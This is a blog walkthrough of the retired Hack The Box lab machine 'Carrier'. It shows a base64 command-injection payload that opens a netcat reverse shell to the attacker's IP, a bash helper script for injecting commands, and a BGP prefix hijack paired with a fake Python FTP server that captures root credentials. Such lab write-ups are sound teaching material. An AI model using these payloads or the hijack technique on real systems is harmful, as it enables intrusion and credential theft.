---
layout: post
title: "Carrier: Hack The Box Walkthrough"
date: 2019-03-17 01:15:19 +0000
last_modified_at: 2019-03-17 01:25:12 +0000
category: Walkthrough
tags: ["Hack The Box", Carrier, retired]
comments: true
image:
  feature: carrier-htb-walkthrough.jpg
  credit: TheDigitalArtist / Pixabay
  creditlink: https://pixabay.com/en/earth-globalisation-network-3866609/
---

This post documents the complete walkthrough of Carrier, a retired vulnerable [VM][1] created by [snowscan][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background

Carrier is a retired vulnerable VM from Hack The Box.

### Information Gathering

Let’s start with a `nmap` scan to establish the available services in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 10.10.10.105
...
PORT   STATE    SERVICE REASON         VERSION
21/tcp filtered ftp     no-response
22/tcp open     ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 15:a4:28:77:ee:13:07:06:34:09:86:fd:6f:cc:4c:e2 (RSA)
|   256 37:be:de:07:0f:10:bb:2b:b5:85:f7:9d:92:5e:83:25 (ECDSA)
|_  256 89:5a:ee:1c:22:02:d2:13:40:f2:45:2e:70:45:b0:c4 (ED25519)
80/tcp open     http    syn-ack ttl 62 Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Login
```

`nmap` finds `22/tcp` and `80/tcp` open. In any case, let's start with the `http` service. Here's how it looks like.

<a class="image-popup">
![2b0f6dd0.png](/assets/images/posts/carrier-htb-walkthrough/2b0f6dd0.png)
</a>

It's a login page with strange looking error codes.

### Directory/File Enumeration

Let's use `wfuzz` and see what we can discover.

```
# wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://10.10.10.105/FUZZ
********************************************************
* Wfuzz 2.3.1 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.105/FUZZ
Total requests: 950

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000244:  C=301      9 L	      28 W	    310 Ch	  "css"
000262:  C=301      9 L	      28 W	    312 Ch	  "debug"
000294:  C=301      9 L	      28 W	    310 Ch	  "doc"
000430:  C=301      9 L	      28 W	    310 Ch	  "img"
000470:  C=301      9 L	      28 W	    309 Ch	  "js"
000844:  C=301      9 L	      28 W	    312 Ch	  "tools"

Total time: 19.44290
Processed Requests: 950
Filtered Requests: 944
Requests/sec.: 48.86101
```

Among the directories discovered, `doc` offers some valuable information. In it, there's a PDF document containing the description of the error codes.

<a class="image-popup">
![9e681a5f.png](/assets/images/posts/carrier-htb-walkthrough/9e681a5f.png)
</a>

You can see what the two strange looking error codes mean. And the password is reset to the serial number is what I think it meant.

After a couple of enumeration rounds I still couldn't find the serial number. It then dawned upon me that I've not check SNMP. It's a web interface to a piece of hardware after all. Many hardware vendors include SNMP for their products. Let's see if we can `snmpwalk` the MIB hierarchy.

<a class="image-popup">
![6d2bff29.png](/assets/images/posts/carrier-htb-walkthrough/6d2bff29.png)
</a>

What do you know! The serial number is exposed and we manage to log in with credentials (`admin:NET_45JDX23`),

<a class="image-popup">
![328e9162.png](/assets/images/posts/carrier-htb-walkthrough/328e9162.png)
</a>

Holy cow!

### Low-Privilege Shell

While I was checking out the pages, I chanced upon the **Diagnostics** page. It allows built-in checks and this is how it looks like.

<a class="image-popup">
![54c15bf2.png](/assets/images/posts/carrier-htb-walkthrough/54c15bf2.png)
</a>

Doesn't the output looks like the output of `ps`? There's a hidden input field that's submitted along with the form whenever the button **Verify status** is clicked.

<a class="image-popup">
![e4d923a2.png](/assets/images/posts/carrier-htb-walkthrough/e4d923a2.png)
</a>

The value to the input field `check` is a `base64`-encoded `quagga`.

<a class="image-popup">
![939c5bd9.png](/assets/images/posts/carrier-htb-walkthrough/939c5bd9.png)
</a>

Hmm. Something funky is going on here.

With that in mind, I wrote a bash script to investigate what's going with the **Diagnostics** page.

<div class="filename"><span>diag.sh</span></div>

```bash
#!/bin/bash

HOST=10.10.10.105
SERIAL=NET_45JDX23
ECHO="$(echo $@ | base64)"

# login
curl -c cookie \
     -d "username=admin&password=$SERIAL" \
     http://$HOST/

# prettify output
curl -s \
     -b cookie \
     --data-urlencode "check=$ECHO" \
     http://$HOST/diag.php \
| xmllint --xpath "//p" --recover - 2>/dev/null \
| sed -r -e 's/></>\n</g' \
| sed -r -e 's/^<p>//' -e 's/<\/p>$//' -e '1d'

echo

rm -f cookie
```

<a class="image-popup">
![e14a8063.png](/assets/images/posts/carrier-htb-walkthrough/e14a8063.png)
</a>

I see what's going on here. There's PHP code that does something like this.

```php
shell_exec("bash -c ps waux | grep " . base64_decode($_POST['check']) . " | grep -v grep");
```

If I input something like this, I should get a shell, right? Let's try it out.

```
--; rm -rf /tmp/p; mknod /tmp/p p; /bin/sh 0</tmp/p | nc 10.10.13.52 1234 > /tmp/p
```

<a class="image-popup">
![301614a9.png](/assets/images/posts/carrier-htb-walkthrough/301614a9.png)
</a>

Indeed. A `root` shell no less!

...

My happiness soon faded because this isn't a `root` shell. Nonetheless, `user.txt` is located here.

<a class="image-popup">
![2308d637.png](/assets/images/posts/carrier-htb-walkthrough/2308d637.png)
</a>

You can see that the host isn't the final host; it's a router. It has three network interfaces.

<a class="image-popup">
![3dff73cf.png](/assets/images/posts/carrier-htb-walkthrough/3dff73cf.png)
</a>

And, here's the routing table.

<a class="image-popup">
![5470c993.png](/assets/images/posts/carrier-htb-walkthrough/5470c993.png)
</a>

Looking at `/root/.ssh/authorized_keys` reveals who's allowed to SSH into the router.

<a class="image-popup">
![e8c7da43.png](/assets/images/posts/carrier-htb-walkthrough/e8c7da43.png)
</a>

***In case you are wondering, I upgraded the shell with the Python3 `pty` module and some `stty` magic.***

Looking back at the `debug` directory, a `phpinfo()` page was there for the viewing.

<a class="image-popup">
![927b454f.png](/assets/images/posts/carrier-htb-walkthrough/927b454f.png)
</a>

That's the `uname -a` of the `web` host. Further down, the server IP is shown.

<a class="image-popup">
![75834d4a.png](/assets/images/posts/carrier-htb-walkthrough/75834d4a.png)
</a>

Neat. Saves me the effort to hunt for it in `/24` space.

_A bigger problem looms._ What's next? Where do we proceed from here?

### Privilege Escalation

Earlier on, the `doc` directory revealed the error codes. Along with it, lies the ISPs' [BGP](https://en.wikipedia.org/wiki/Border_Gateway_Protocol) peering layout of their respective autonomous systems (or AS).

<a class="image-popup">
![ca85abb8.png](/assets/images/posts/carrier-htb-walkthrough/ca85abb8.png)
</a>

Coupled with the tickets, we can formalized a game plan.

<a class="image-popup">
![4336f0de.png](/assets/images/posts/carrier-htb-walkthrough/4336f0de.png)
</a>

But before we go over the game plan, let's confirm the BGP peering topology with `vtysh -c 'show ip bgp'` on `r1` (that's the host we are in. It's running a software-based router daemon `quagga` capable of doing BGP).

<a class="image-popup">
![07bd4635.png](/assets/images/posts/carrier-htb-walkthrough/07bd4635.png)
</a>

From the information above, we can see that the 10.120.15.0/24 prefix is advertised by AS300. That's why the best path to 10.120.15.0/24 is through the edge router in AS300 because it's directly connected to AS100. As such, it's only one hop away. Compare this to another alternative and valid route. The route must first go to the edge router in AS200 and then to the edge router in AS300.

Here's the game plan. According to the tickets, an important FTP server I suppose, contains the golden ticket to own the system, lives in AS300. And, we have a accommodating VIP who is always trying to log in to the FTP server with his/her credentials. FTP is a plaintext protocol, which means that the credentials are also in clear. If we can somehow snoop on the traffic, we should be able to sniff out the credentials.

Enter BGP prefix hijacking. If we advertise a more specific prefix than 10.120.15.0/24 in AS100, we can trick all the traffic bound for the FTP server to come to our router `r1` in AS100 instead. Of course, we also need to set up a FTP server to pull off the ruse.

Now, let's see what I've found. The FTP server is at 10.120.15.10.

<a class="image-popup">
![a0830341.png](/assets/images/posts/carrier-htb-walkthrough/a0830341.png)
</a>

In addtion to FTP, the server is also running DNS and SSH service.

<a class="image-popup">
![3e7ffac3.png](/assets/images/posts/carrier-htb-walkthrough/3e7ffac3.png)
</a>

Which means, we can do something like this.

<a class="image-popup">
![a2d240ca.png](/assets/images/posts/carrier-htb-walkthrough/a2d240ca.png)
</a>

Now, before we modify the prefix advertisement in `r1`, know this. There's a `cron` job that reverts `quagga` to its default configuration, lending evidence that I'm taking the right approach.

<a class="image-popup">
![06082df7.png](/assets/images/posts/carrier-htb-walkthrough/06082df7.png)
</a>

The above can be shown with `crontab -l`. And here's what `/opt/restore.sh` looks like.

<a class="image-popup">
![15f58d6f.png](/assets/images/posts/carrier-htb-walkthrough/15f58d6f.png)
</a>

We need to disable the `cron` job. Add a comment with a `#` to disable it.

```
#*/10 * * * * /opt/restore.sh
```

Next, advertise the most specific 10.120.15.10/32 prefix like so. Restart `quagga` and wait for the advertisement to propagate to the other two AS.

<a class="image-popup">
![db7492c0.png](/assets/images/posts/carrier-htb-walkthrough/db7492c0.png)
</a>

The prefix is updated.

<a class="image-popup">
![0c7c2d2e.png](/assets/images/posts/carrier-htb-walkthrough/0c7c2d2e.png)
</a>

The next step involves setting a service listening at `21/tcp`. I wrote a simple FTP server that does nothing but to extract the username and password; and to print it to `stdout`.

<div class="filename"><span>ftp.py</span></div>

```python
import socket

host = ''
port = 21

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
  s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  s.bind((host,port))
  s.listen(1)
  conn, addr = s.accept()
  with conn:
    while True:
      conn.send(b"220 Welcome to FTP\r\n")
      print(conn.recv(1024).decode('utf_8')[:-2])
      conn.send(b"331 User name okay need password\r\n")
      print(conn.recv(1024).decode('utf-8')[:-2])
      break
    conn.close()
  s.shutdown(socket.SHUT_RDWR)
  s.close()
```

Run it like so.

```
# python3 ftp.py > ftp.txt &
```

The last step is to configure the network interface `eth2` to 10.120.15.10/24 and we are done.

```
# ifconfig eth2 10.120.15.10/24
```

Almost immediately, the credentials are printed out to `/tmp/ftp.txt`.

<a class="image-popup">
![1ac3dd57.png](/assets/images/posts/carrier-htb-walkthrough/1ac3dd57.png)
</a>

Awesome. Now, we can revert the network configurations and log in to `carrier` with the `root` credentials to claim our prize.

<a class="image-popup">
![bc9d88bf.png](/assets/images/posts/carrier-htb-walkthrough/bc9d88bf.png)
</a>

And our prize...

<a class="image-popup">
![c625a11a.png](/assets/images/posts/carrier-htb-walkthrough/c625a11a.png)
</a>

:dancer:

### Afterthought

It was hell of a ride. The creator sure knows a thing or two about containers and container networking!

[1]: https://www.hackthebox.eu/home/machines/profile/155
[2]: https://www.hackthebox.eu/home/users/profile/9267
[3]: https://www.hackthebox.eu/
